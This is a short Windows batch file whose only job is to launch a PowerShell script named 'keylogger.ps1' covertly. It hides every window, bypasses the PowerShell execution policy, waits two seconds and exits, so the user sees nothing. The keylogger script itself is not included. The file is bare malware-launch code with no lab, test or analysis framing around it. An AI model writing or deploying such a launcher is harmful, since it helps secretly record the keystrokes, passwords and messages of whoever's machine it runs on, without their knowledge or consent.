@echo off
cd /d "%~dp0"
powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1' -WindowStyle Hidden"
timeout /t 2 >nul
exit